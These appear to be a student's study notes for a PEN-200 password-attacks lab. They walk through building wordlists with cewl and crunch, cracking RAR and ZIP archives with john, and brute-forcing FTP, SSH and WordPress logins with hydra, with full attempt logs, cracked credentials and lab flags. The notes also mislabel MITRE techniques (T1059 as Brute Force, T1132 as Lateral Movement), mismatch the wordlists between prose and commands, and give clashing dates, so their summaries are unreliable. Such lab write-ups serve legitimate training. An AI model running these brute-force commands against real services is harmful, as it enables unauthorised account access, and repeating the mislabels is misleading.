---
title: 'PEN-200: 19.4.6 Password cracking'
aliases: []
tags:
- topic/offsec-labs
category: study_notes
status: draft
date_created: '2026-08-27'
date_modified: '2026-08-27'
source: lab.md
related_tools:
- '[[cewl]]'
- '[[john]]'
- '[[rar2john]]'
- '[[crunch]]'
- '[[hydra]]'
- '[[zip2john]]'
related_techniques:
- '[[t1003]]'
- '[[t1059]]'
- '[[password-cracking]]'
- '[[dictionary attack]]'
- '[[http-post-form]]'
related_tactics:
- '[[t1132]]'
- '[[defense-evasion]]'
- '[[credential access]]'
- '[[credential-access]]'
related_services:
- '[[ftp]]'
- '[[ftp]]'
- '[[http]]'
- '[[ssh]]'
related_os:
- '[[flag-txt]]'
- '[[2.crunch]]'
- '[[2.hashes]]'
- '[[2.words]]'
- '[[crunch.txt]]'
- '[[megacorp-cewl.txt]]'
- '[[mutated.txt]]'
- '[[notes.md]]'
- '[[rar.hashes]]'
- '[[rar.txt]]'
- '[[START]]'
- '[[una.txt]]'
- '[[words.lst]]'
- '[[/home/student/passwords.txt]]'
- '[[~/.hushlogin]]'
related_notes: []
mitre_tactic: ''
mitre_technique: ''
real_path: ''
port: ''
protocol: ''
os: ''
---

# PEN-200: 19.4.6 Password cracking

## Overview
This document is titled 'offsec labs' and is tagged with 'offsec' and 'labs'. It was created on 2023-01-27.

## Description
This section describes the process of generating a custom wordlist to crack encrypted files using password cracking techniques. The scenario involves two different encrypted files, `flag.rar` and `flag.zip`, and the steps to generate and use a wordlist to extract the flags.

The task involves using a list of possible employee usernames to log into a website with HTTP authentication. The usernames are stored in a file named `users.txt` located on the web server's root path. The password attack is performed using the `hydra` tool.

The document describes the process of attempting to crack the password for a target machine using the `hydra` tool. The target machine is `192.168.125.52` and the login is `shadow-man`. Several password attempts were made, but only one was successful, with the password being `abcdef`. After successfully logging in via SSH, the user navigated to the home directory and attempted to read a `flag.txt` file, which contained the flag `OS{4c9cc0db12cde55dd8a14f8033d89d9f}`.

## Password Cracking Process for `flag.rar`
1. **Identify Potential Passwords**: The manager's other passwords, such as `nanomedicines234` and `Cyberisation649`, are identified. The word `nanomedicines` and `Cyberisation` are known to be products of MegaCorp, and the password requirement is at least 12 characters with 3 digits.

2. **Generate Wordlist**: A wordlist is generated using `cewl` with the command `cewl www.megacorpone.com -m 9 -w words.lst`.

3. **Add Digits to Wordlist**: The wordlist is modified by adding three digits to the end of each word using `john --wordlist=words.lst --rules --stdout > mutated.txt`.

4. **Crack the RAR File**: The `flag.rar` file is cracked using `john` with the command `john --rules --wordlist=mutated.txt a.txt`.

5. **Extract the Flag**: The flag is extracted from the `flag.rar` file using `unrar x flag.rar` and the flag is found in `flag.txt`.

## Password Cracking Process for `flag.zip`
1. **Identify Potential Passwords**: The manager's other passwords, such as `bella9221!!` and `charlie2323##`, are identified. The names of her pets, `rosie` and `bailey`, are known, and a third pet named `buddy` is found on her social media.

2. **Generate Wordlist**: A wordlist is generated using `crunch` with the command `crunch 11 11 -t buddy%%%%^^ > 2.crunch`.

## Tools and Techniques
The following tools and techniques are used in the process:

- **Tools**: `cewl`, `john`, `rar2john`, `crunch`
- **Techniques**: `T1003` (Credential Access), `T1059` (Brute Force)
- **Tactics**: `T1132` (Lateral Movement)

## Password Cracking
The password cracking process involves using tools like `john` and `hydra` to attempt to crack passwords. The following commands were used to crack the password for the `flag.zip` file and the FTP server.

To crack the password for the `flag.zip` file, the following commands were executed:

```bash
zip2john flag.zip 2.hashes
zip2john flag.zip > 2.hashes
sudo john --rules --wordlist=2.crunch 2.hashes
```

After successfully cracking the password, the `flag.txt` file was extracted using the following command:

```bash
unzip flag.zip
```

The content of `flag.txt` is as follows:

```
OS{419108f742fc2ce7e79e890d44c1b1e3}
```

To crack the password for the FTP server, the following command was used:

```bash
hydra -l offsec -P /home/kali/Documents/git/SecLists/Passwords/500-worst-passwords.txt  ftp://$IP -vV -t 3
```

This command attempts to log into the FTP server with the user `offsec` using a list of 500 worst passwords.

Use a password attack technique to log into the target VM #6 via SSH with the user offsec.

```bash
hydra -l offsec -P /usr/share/wordlists/rockyou.txt ssh://$IP -vVf -s 2222
```

[ATTEMPT] target 192.168.125.52 - login "offsec" - pass "dallas" - 542 of 14344400 [child 0] (0/1)
[ATTEMPT] target 192.168.125.52 - login "offsec" - pass "hearts" - 543 of 14344400 [child 8] (0/1)
[ATTEMPT] target 192.168.125.52 - login "offsec" - pass "camille" - 544 of 14344400 [child 1] (0/1)
[ATTEMPT] target 192.168.125.52 - login "offsec" - pass "wilson" - 545 of 14344400 [child 3] (0/1)
[ATTEMPT] target 192.168.125.52 - login "offsec" - pass "potter" - 546 of 14344400 [child 4] (0/1)
[ATTEMPT] target 192.168.125.52 - login "offsec" - pass "pumpkin" - 547 of 14344400 [child 7] (0/1)
[ATTEMPT] target 192.168.125.52 - login "offsec" - pass "iloveu2" - 548 of 14344400 [child 10] (0/1)
[ATTEMPT] target 192.168.125.52 - login "offsec" - pass "number1" - 549 of 14344400 [child 11] (0/1)
[ATTEMPT] target 192.168.125.52 - login "offsec" - pass "katie" - 550 of 14344400 [child 12] (0/1)
[ATTEMPT] target 192.168.125.52 - login "offsec" - pass "guitar" - 551 of 14344400 [child 13] (0/1)
[2222][ssh] host: 192.168.125.52   login: offsec   password: katie
[STATUS] attack finished for 192.168.125.52 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-03-08 20:42:57

```bash
ssh offsec@$IP -p 2222 -o "UserKnownHostsFile=/dev/null"
```

The authenticity of host '[192.168.125.52]:2222 ([192.168.125.52]:2222)' can't be established.
ED25519 key fingerprint is SHA256:B0J0flfJ43NpUkFeZpWEqdxJ2CHcvg2tS02m+kv81Sw.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.125.52]:2222' (ED25519) to the list of known hosts.
Welcome to the PTAP Kali Linux Shell.
offsec@06789d7050e7:~$
ls
flag.txt
offsec@06789d7050e7:~$
cat flag.txt
OS{32670949a015060c38b6db59632bcc36}
offsec@06789d7050e7:~$

## Password Cracking Attempt
The password cracking attempt was performed against the target VM #4 using the `hydra` tool. The attack targeted the FTP service with the `offsec` user and a list of common passwords from the RockYou wordlist. The attack was configured to run 3 tasks in parallel, with a total of 499 login attempts. The attack was monitored with verbose output, showing the progress of each login attempt and the status of the attack.

```bash
[DATA] max 3 tasks per 1 server, overall 3 tasks, 499 login tries (l:1/p:499), ~167 tries per task
[DATA] attacking ftp://192.168.125.52:21/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[ATTEMPT] target 192.168.125.52 - login "offsec" - pass "123456" - 1 of 499 [child 0] (0/0)
[ATTEMPT] target 192.168.125.52 - login "offsec" - pass "password" - 2 of 499 [child 1] (0/0)
[ATTEMPT] target 192.168.125.52 - login "offsec" - pass "12345678" - 3 of 499 [child 2] (0/0)
[ATTEMPT] target 192.168.125.52 - login "offsec" - pass "1234" - 4 of 499 [child 0] (0/0)
[ATTEMPT] target 192.168.125.52 - login "offsec" - pass "pussy" - 5 of 499 [child 2] (0/0)
[ATTEMPT] target 192.168.125.52 - login "offsec" - pass "12345" - 6 of 499 [child 1] (0/0)
[ATTEMPT] target 192.168.125.52 - login "offsec" - pass "dragon" - 7 of 499 [child 0] (0/0)
[ATTEMPT] target 192.168.125.52 - login "offsec" - pass "qwerty" - 8 of 499 [child 1] (0/0)
[ATTEMPT] target 192.168.125.52 - login "offsec" - pass "696969" - 9 of 499 [child 2] (0/0)
[ATTEMPT] target 192.168.125.52 - login "offsec" - pass "mustang" - 10 of 499 [child 0] (0/0)
[ATTEMPT] target 192.168.125.52 - login "offsec" - pass "letmein" - 11 of 499 [child 1] (0/0)
[ATTEMPT] target 192.168.125.52 - login "offsec" - pass "baseball" - 12 of 499 [child 2] (0/0)
[STATUS] 12.00 tries/min, 12 tries in 00:01h, 487 to do in 00:41h, 3 active
[ATTEMPT] target 192.168.125.52 - login "offsec" - pass "master" - 13 of 499 [child 1] (0/0)
[ATTEMPT] target 192.168.125.52 - login "offsec" - pass "michael" - 14 of 499 [child 0] (0/0)
[ATTEMPT] target 192.168.125.52 - login "offsec" - pass "football" - 15 of 499 [child 2] (0/0)
[ATTEMPT] target 192.168.125.52 - login "offsec" - pass "shadow" - 16 of 499 [child 2] (0/0)
[ATTEMPT] target 192.168.125.52 - login "offsec" - pass "monkey" - 17 of 499 [child 0] (0/0)
[ATTEMPT] target 192.168.125.52 - login "offsec" - pass "abc123" - 18 of 499 [child 1] (0/0)
[ATTEMPT] target 192.168.125.52 - login "offsec" - pass "pass" - 19 of 499 [child 0] (0/0)
[ATTEMPT] target 192.168.125.52 - login "offsec" - pass "fuckme" - 20 of 499 [child 2] (0/0)
[ATTEMPT] target 192.168.125.52 - login "offsec" - pass "6969" - 21 of 499 [child 1] (0/0)
[ATTEMPT] target 192.168.125.52 - login "offsec" - pass "jordan" - 22 of 499 [child 0] (0/0)
[ATTEMPT] target 192.168.125.52 - login "offsec" - pass "harley" - 23 of 499 [child 2] (0/0)
[ATTEMPT] target 192.168.125.52 - login "offsec" - pass "ranger" - 24 of 499 [child 1] (0/0)
[ATTEMPT] target 192.168.125.52 - login "offsec" - pass "iwantu" - 25 of 499 [child 0] (0/0)
[ATTEMPT] target 192.168.125.52 - login "offsec" - pass "jennifer" - 26 of 499 [child 1] (0/0)
[ATTEMPT] target 192.168.125.52 - login "offsec" - pass "hunter" - 27 of 499 [child 2] (0/0)
[ATTEMPT] target 192.168.125.52 - login "offsec" - pass "fuck" - 28 of 499 [child 0] (0/0)
[STATUS] 9.33 tries/min, 28 tries in 00:03h, 471 to do in 00:51h, 3 active
[ATTEMPT] target 192.168.125.52 - login "offsec" - pass "2000" - 29 of 499 [child 1] (0/0)
[ATTEMPT] target 192.168.125.52 - login "offsec" - pass "test" - 30 of 499 [child 2] (0/0)
[ATTEMPT] target 192.168.125.52 - login "offsec" - pass "batman" - 31 of 499 [child 0] (0/0)
[ATTEMPT] target 192.168.125.52 - login "offsec" - pass "trustno1" - 32 of 499 [child 2] (0/0)
[ATTEMPT] target 192.168.125.52 - login "offsec" - pass "thomas" - 33 of 499 [child 1] (0/0)
[ATTEMPT] target 192.168.125.52 - login "offsec" - pass "tigger" - 34 of 499 [child 0] (0/0)
[ATTEMPT] target 192.168.125.52 - login "offsec" - pass "robert" - 35 of 499 [child 2] (0/0)
[ATTEMPT] target 192.168.125.52 - login "offsec" - pass "access" - 36 of 499 [child 1] (0/0)
[ATTEMPT] target 192.168.125.52 - login "offsec" - pass "love" - 37 of 499 [child 0] (0/0)
[ATTEMPT] target 192.168.125.52 - login "offsec" - pass "buster" - 38 of 499 [child 0] (0/0)
[21][ftp] host: 192.168.125.52   login: offsec   password: buster
[STATUS] attack finished for 192.168.125.52 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-03-08 18:55:59
```

The attack was successful, with the password `buster` being found for the `offsec` user.

## Command Syntax
The `hydra` command used to perform the password attack is as follows:
```
hydra -L users.txt -p blahblah  $IP http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.125.52%2Fwp-admin%2F&testcookie=1:Unknown username" -vVF
```

This command attempts to log in using the usernames from `users.txt` and the password `blahblah`.

## Example Output
The output of the `hydra` command is as follows:
```
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-03-08 20:03:52
[DATA] max 16 tasks per 1 server, overall 16 tasks, 43 login tries (l:43/p:1), ~3 tries per task
[DATA] attacking http-post-form://192.168.125.52:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.125.52%2Fwp-admin%2F&testcookie=1:Unknown username
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[ATTEMPT] target 192.168.125.52 - login "michael" - pass "blahblah" - 10 of 43 [child 9] (0/0)
[80][http-post-form] host: 192.168.125.52   login: michael   password: blahblah
[STATUS] attack finished for 192.168.125.52 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-03-08 20:03:53
```

This output indicates that the username `michael` and the password `blahblah` were successfully used to log in.

## Second Attempt
A second attempt was made using a different password list, `rockyou.txt`, with the following command:
```
hydra -l michael -P /usr/share/wordlists/rockyou.txt   $IP http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.125.52%2Fwp-admin%2F&testcookie=1:Error" -vVF
```

This command attempts to log in using the username `michael` and a list of common passwords from `rockyou.txt`.

## Reading Flag from VM #7
The shadow man admin messed up the configurations on the target VM #7 server and gave you access to see something he shouldn't have. Can you use this access to read the flag?

```bash
scp -P 2222 student@$IP:/home/student/passwords.txt /home/kali/Documents/git/bravo/offsec/pen200/19-PasswordAttacks/7.passwords
```

The authenticity of host '[192.168.125.52]:2222 ([192.168.125.52]:2222)' can't be established.
ED25519 key fingerprint is SHA256:kQWbnD1pQhMxOmnxjR2BRK205LhaOodfylZWjIPpX9s.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.125.52]:2222' (ED25519) to the list of known hosts.
Welcome to the PEN-200 Kali Linux Shell.
student@192.168.125.52's password: 
passwords.txt                                                                                                                                             100% 1527     2.4KB/s   00:00

```bash
hydra -l "shadow-man" -P 7.passwords ssh://$IP -vVf -s 2222
```

Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-03-08 20:50:03
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 195 login tries (l:1/p:195), ~13 tries per task
[DATA] attacking ssh://192.168.125.52:2222/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[INFO] Testing if password authentication is supported by ssh://shadow-man@192.168.125.52:2222
[INFO] Successful, password authentication is supported by ssh://192.168.125.52:2222
[ATTEMPT] target 192.168.125.52 - login "shadow-man" - pass "zxcvbnm" - 1 of 195 [child 0] (0/0)
[ATTEMPT] target 192.168.125.52 - login "shadow-man" - pass "edward" - 2 of 195 [child 1] (0/0)
[ATTEMPT] target 192.168.125.52 - login "shadow-man" - pass "oliver" - 3 of 195 [child 2] (0/0)
[ATTEMPT] target 192.168.125.52 - login "shadow-man" - pass "diana" - 4 of 195 [child 3] (0/0)
[ATTEMPT] target 192.168.125.52 - login "shadow-man" - pass "samsung" - 5 of 195 [child 4] (0/0)

## Command Output
```
[ATTEMPT] target 192.168.125.52 - login "shadow-man" - pass "mybaby" - 123 of 195 [child 5] (0/0)
[ATTEMPT] target 192.168.125.52 - login "shadow-man" - pass "sergio" - 124 of 195 [child 6] (0/0)
[ATTEMPT] target 192.168.125.52 - login "shadow-man" - pass "welcome" - 125 of 195 [child 7] (0/0)
[ATTEMPT] target 192.168.125.52 - login "shadow-man" - pass "metallica" - 126 of 195 [child 10] (0/0)
[2222][ssh] host: 192.168.125.52   login: shadow-man   password: abcdef
[STATUS] attack finished for 192.168.125.52 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-03-08 20:51:06
```

```
┌──(kali㉿kali)-[~/…/bravo/offsec/pen200/19-PasswordAttacks]
└─$ ssh shadow-man@$IP -p 2222 -o "UserKnownHostsFile=/dev/null"
```

```
The authenticity of host '[192.168.125.52]:2222 ([192.168.125.52]:2222)' can't be established.
ED25519 key fingerprint is SHA256:kQWbnD1pQhMxOmnxjR2BRK205LhaOodfylZWjIPpX9s.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.125.52]:2222' (ED25519) to the list of known hosts.
Welcome to the PEN-200 Kali Linux Shell.
shadow-man@192.168.125.52's password: 
```
┏━(Message from Kali developers)
┃
┃ This is a minimal installation of Kali Linux, you likely
┃ want to install supplementary tools. Learn how:
┃ ⇒ https://www.kali.org/docs/troubleshooting/common-minimum-setup/
┃
┗━(Run: “touch ~/.hushlogin” to hide this message)
shadow-man@de398d6b8762:~$ ls
flag.txt
shadow-man@de398d6b8762:~$ cat flag
```
```
cat: flag: No such file or directory
shadow-man@de398d6b8762:~$ cat flag.txt
OS{4c9cc0db12cde55dd8a14f8033d89d9f}
shadow-man@de398d6b8762:~$ ```

